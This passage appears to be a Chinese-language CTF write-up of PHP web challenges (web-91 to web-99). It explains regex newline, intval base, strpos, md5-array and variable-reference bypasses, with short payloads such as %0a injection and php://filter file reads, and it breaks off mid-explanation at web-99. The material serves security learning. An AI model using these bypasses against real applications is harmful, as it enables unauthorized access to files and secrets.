class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/im&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^php$/i&#x27;</span>, <span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;hacker&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;nonononono&#x27;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>第一个preg_match匹配多行匹配“php”   第二个preg_match只能匹配第一行中的“php”</strong></p><p><strong>%0a是换行</strong></p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">cmd</span>=%0aphp<br>?<span class="hljs-attribute">cmd</span>=abc%0aphp<br>?<span class="hljs-attribute">cmd</span>=php%0a%0a<br>?<span class="hljs-attribute">cmd</span>=php%0aphp<br></code></pre></td></tr></table></figure><hr><h3 id="正则匹配模式"><a href="#正则匹配模式" class="headerlink" title="正则匹配模式"></a>正则匹配模式</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-operator">/</span>i表示匹配大小写<br><br>字符 <span class="hljs-operator">^</span> 和 $ 同时使用时，表示精确匹配，需要匹配以php开头和以php结尾<br><br>m<br>多(more)行匹配<br>若存在换行\n并且有开始<span class="hljs-operator">^</span>或结束<span class="hljs-variable">$符的情况下，</span><br>将以换行为分隔符，逐行进行匹配<br><span class="hljs-variable">$str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abc<span class="hljs-subst">\n</span>abc&quot;</span>;<br><span class="hljs-variable">$preg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/^abc$/m&quot;</span>;<br>preg_match(<span class="hljs-variable">$preg</span>, <span class="hljs-variable">$str</span>,<span class="hljs-variable">$matchs</span>);<br>这样其实是符合正则表达式的，因为匹配的时候 先是匹配换行符前面的，接着匹配换行符后面的，两个都是abc所以可以通过正则表达式<span class="hljs-operator">。</span><br><br>s<br>特殊字符圆点 . 中包含换行符<br>默认的圆点 . 是匹配除换行符 \n 之外的任何单字符，加上s之后, .包含换行符<br><span class="hljs-variable">$str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;abggab<span class="hljs-subst">\n</span>acbs&quot;</span>;<br><span class="hljs-variable">$preg</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/b./s&quot;</span>;<br>preg_match_all(<span class="hljs-variable">$preg</span>, <span class="hljs-variable">$str</span>,<span class="hljs-variable">$matchs</span>);<br>这样匹配到的有三个 bg b\n bs<br><br>g<br>全局匹配，查找所有匹配项<br><br><span class="hljs-type">A</span><br>强制从目标字符串开头匹配;<br><br><span class="hljs-type">D</span><br>如果使用<span class="hljs-variable">$限制结尾字符</span>,则不允许结尾有换行; <br><br>e<br>配合函数preg_replace()使用, 可以把匹配来的字符串当作正则表达式执行; <br></code></pre></td></tr></table></figure><hr><h2 id="web-92（intval）"><a href="#web-92（intval）" class="headerlink" title="web-92（intval）"></a>web-92（intval）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><ol><li><strong>第一个判断变成弱类型比较，所以不能用4476a绕过。重点是intval的第二个参数base，base&#x3D;0时，intval会自动探测num的进制：如果num以0x开头，那么按16进制转换；如果num以0开头，默认按8进制转换；否则使用10进制。所以这个题用16进制绕过即可</strong></li><li><strong><code>intval()</code>将浮点数转化为整型，使得条件成立，所以可以使用浮点数绕过</strong></li></ol><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=0x117c<br>?<span class="hljs-attribute">num</span>=4476.1<br></code></pre></td></tr></table></figure><hr><h3 id="弱类型比较"><a href="#弱类型比较" class="headerlink" title="弱类型比较"></a>弱类型比较</h3><p>在php中两个等号&#x3D;&#x3D;是弱类型比较，只需要值相等，不会检测类型是否相同，类型不同时会自动转换</p><p>特殊情况：0exxx类型字符串不管0e后的数字如何，都为0所以可以绕过弱类型比较</p><hr><h2 id="web-93（intval）"><a href="#web-93（intval）" class="headerlink" title="web-93（intval）"></a>web-93（intval）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><ol><li><strong>这题字母比上题多加了个正则匹配，不能出现字母，所以十六进制绕过不行了，但是可以使用8进制绕过</strong>，<strong>注意这里10574要以0开头才会按8进制转换</strong></li><li><strong>也可以使用浮点数绕过</strong></li></ol><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=010574<br>?<span class="hljs-attribute">num</span>=4476.1<br></code></pre></td></tr></table></figure><hr><h2 id="web-94（intval）"><a href="#web-94（intval）" class="headerlink" title="web-94（intval）"></a>web-94（intval）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>===<span class="hljs-string">&quot;4476&quot;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]/i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p>这里多了个strpos函数来查找0第一次在字符串中出现的位置，如果没找到会返回false，所以我们的payload中必须有0且0不能在第一位，所以8进制绕过不能用了。但是还有三种绕过方式</p><p><strong>我们可以在<code>010574</code>前面加一个<code>+</code>号，这样0就不在第一位了，intval转换后变为4476。</strong></p><p><strong>因为第一个判断使用的是强类型比较，所以可以在010574前加一个空格。intval转换依旧变为4476</strong></p><p><strong>同理还可以使用浮点数4476.0绕过</strong></p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=+010574<br>?num= 010574<br>?<span class="hljs-attribute">num</span>=4476.0<br></code></pre></td></tr></table></figure><hr><h3 id="strpos"><a href="#strpos" class="headerlink" title="strpos()"></a>strpos()</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">strpos</span><span class="hljs-params">()</span></span> - 查找字符串在另一字符串中第一次出现的位置（区分大小写）<br><span class="hljs-function"><span class="hljs-title">stripos</span><span class="hljs-params">()</span></span> 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）<br><span class="hljs-function"><span class="hljs-title">strrpos</span><span class="hljs-params">()</span></span> - 查找字符串在另一字符串中最后一次出现的位置（区分大小写）<br><span class="hljs-function"><span class="hljs-title">strripos</span><span class="hljs-params">()</span></span> - 查找字符串在另一字符串中最后一次出现的位置（不区分大小写）<br></code></pre></td></tr></table></figure><hr><h2 id="web-95（intval）"><a href="#web-95（intval）" class="headerlink" title="web-95（intval）"></a>web-95（intval）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;num&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>==<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-z]|\./i&quot;</span>, <span class="hljs-variable">$num</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$num</span>, <span class="hljs-string">&quot;0&quot;</span>))&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no!!!&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>,<span class="hljs-number">0</span>)===<span class="hljs-number">4476</span>)&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>解题思路：还是要绕过strpos函数</strong></p><p><strong>多过滤了一个点，导致我们无法使用小数点绕过，但是可以在8进制绕过的基础上前面加个+号来绕过</strong></p><p><strong>空格和换行符同理</strong></p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">num</span>=+010574<br>?num= 010574<br>?<span class="hljs-attribute">num</span>=%0a010574<br></code></pre></td></tr></table></figure><hr><h2 id="web-96（按路径读取文件）"><a href="#web-96（按路径读取文件）" class="headerlink" title="web-96（按路径读取文件）"></a>web-96（按路径读取文件）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]==<span class="hljs-string">&#x27;flag.php&#x27;</span>)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no no no&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;u&#x27;</span>]);<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>这题要我们想办法读取flag.php，但是又不能直接传flag.php，可以利用路径来读，也可以使用php伪协议</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?u</span>=<span class="hljs-regexp">/var/www</span><span class="hljs-regexp">/html/flag</span>.php绝对路径<br><span class="hljs-string">?u</span>=./flag.php相对路径<br><span class="hljs-string">?u</span>=<span class="hljs-symbol">php:</span>/<span class="hljs-regexp">/filter/resource</span>=flag.phpphp伪协议<br></code></pre></td></tr></table></figure><hr><h3 id="highlight-file"><a href="#highlight-file" class="headerlink" title="highlight_file()"></a>highlight_file()</h3><p><code>highlight_file()</code> 函数用于将指定文件的内容以 HTML 格式进行高亮显示，并输出到浏览器。</p><p>语法：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">string</span> <span class="hljs-variable">$filename</span>, <span class="hljs-keyword">bool</span> <span class="hljs-variable">$return</span> = <span class="hljs-literal">false</span>)<br></code></pre></td></tr></table></figure><p>参数：</p><ul><li><code>$filename</code>：必需，要高亮显示的文件路径。</li><li><code>$return</code>：可选，如果设置为 <code>true</code>，则返回高亮显示的文件内容，否则将内容直接输出到浏览器。</li></ul><p>返回值： 如果 <code>$return</code> 参数设置为 <code>true</code>，则返回高亮显示的文件内容；否则没有返回值。</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>highlight_file(<span class="hljs-string">&quot;example.php&quot;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>上述示例将会将名为 <code>example.php</code> 的文件内容以 HTML 格式进行高亮显示，并输出到浏览器。</p><hr><h2 id="web-97（md5函数漏洞）"><a href="#web-97（md5函数漏洞）" class="headerlink" title="web-97（md5函数漏洞）"></a>web-97（md5函数漏洞）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) <span class="hljs-keyword">and</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>] != <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>])<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;a&#x27;</span>]) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br><span class="hljs-keyword">else</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&#x27;Wrong.&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p>这里我们用post传的值a和b需要不等，而且在md5函数处理后要全等</p><p><strong>利用数组</strong></p><p><strong>MD5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。</strong></p><p>payload：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">POST：<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[]</span>=<span class="hljs-number">1</span>&amp;<span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[]</span>=<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><hr><h3 id="md5-加密函数"><a href="#md5-加密函数" class="headerlink" title="md5()加密函数"></a>md5()加密函数</h3><p><a href="https://www.runoob.com/php/func-string-md5.html">md5函数用法</a></p><p>md5() 函数计算字符串的 MD5 散列。</p><p>md5() 函数使用 RSA 数据安全，包括 MD5 报文摘要算法。</p><p>来自 RFC 1321 的解释 -  MD5 报文摘要算法：<em>MD5 报文摘要算法将任意长度的信息作为输入值，并将其换算成一个 128  位长度的”指纹信息”或”报文摘要”值来代表这个输入值，并以换算后的值作为结果。MD5  算法主要是为数字签名应用程序而设计的；在这个数字签名应用程序中，较大的文件将在加密（这里的加密过程是通过在一个密码系统下[如：RSA]的公开密钥下设置私有密钥而完成的）之前以一种安全的方式进行压缩。</em></p><p>如需计算文件的 MD5 散列，请使用 <a href="https://www.runoob.com/php/func-string-md5-file.html">md5_file()</a> 函数。</p><p><strong>md5() 函数不能处理数组，数组都返回 null，md5(a[])  结果为 null。</strong></p><hr><h2 id="web-98（审计、传参、引用）"><a href="#web-98（审计、传参、引用）" class="headerlink" title="web-98（审计、传参、引用）"></a>web-98（审计、传参、引用）</h2><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><span class="hljs-variable">$_GET</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_POST</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_COOKIE</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$_GET</span>=&amp;<span class="hljs-variable">$_SERVER</span>:<span class="hljs-string">&#x27;flag&#x27;</span>;<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;HTTP_FLAG&#x27;</span>]==<span class="hljs-string">&#x27;flag&#x27;</span>?<span class="hljs-variable">$flag</span>:<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>解题思路：</p><p><strong>&amp;是引用符号，意思是：不同的名字访问同一个变量内容。php的引用是在变量或者函数、对象等前面加上&amp;符号，PHP 的引用允许你用两个变量来指向同一个内容</strong></p><p><strong>$_GET?$_GET&#x3D;&amp;$_POST:’flag’;意思：如果存在get方式，就把post的地址传给get，相当于get,只不过要利用post传一下参数</strong></p><p><strong>highlight_file($_GET[‘HTTP_FLAG’]&#x3D;&#x3D;’flag’?$flag:FILE)意思：如果有通过GET方法传参’HTTP_FLAG&#x3D;flag’，就highlight_file($flag)。否则highlight_file(FILE)</strong></p><p>中间两行不用管</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">GET：?111随便传但是不能没有<br>POST：<span class="hljs-attribute">HTTP_FLAG</span>=flag<br></code></pre></td></tr></table></figure><hr><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p><strong>&amp;符号的利用</strong></p><p>感觉有点像c里的取地址符，指针</p><p>比如：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">test</span></span>&#123;<br>var <span class="hljs-variable">$enter</span>;<br>var <span class="hljs-variable">$secret</span>;<br>&#125;<br><br><br><span class="hljs-variable">$a</span> = new test();<br><span class="hljs-variable">$a</span>-&gt;enter = &amp;<span class="hljs-variable">$a</span>-&gt;secret;<br></code></pre></td></tr></table></figure><p>这里就相当于a对象中的成员属性enter的值引用了a对象中成员属性secret的值，所以当secret的值改变的时候，enter依然与enter相同</p><hr><h1 id="web-99（审计、in-array、file-put-contents）"><a href="#web-99（审计、in-array、file-put-contents）" class="headerlink" title="web-99（审计、in_array、file_put_contents）"></a>web-99（审计、in_array、file_put_contents）</h1><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$allow</span> = <span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">36</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">0x36d</span>; <span class="hljs-variable">$i</span>++) &#123; <br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$allow</span>, <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>,<span class="hljs-variable">$i</span>));<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-variable">$allow</span>))&#123;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;n&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p> 解题思路：</p><ul><li>highlight_file(<em>file</em>)：将当前文件的代码以语法高亮的形式输出到浏览器；</li><li><strong>array_push()：向数组尾部插入一个或多个元素。</strong></li><li>在这里插入图片描述</li><li><strong>rand()：生成随机数。</strong></li><li><strong>in_array(参数1，参数2)：搜索数组中是否存在指定的值。第一个参数为要搜索的值，第二个参数为被搜索的数组。</strong></li><li><strong>file_put_conntent(filename, 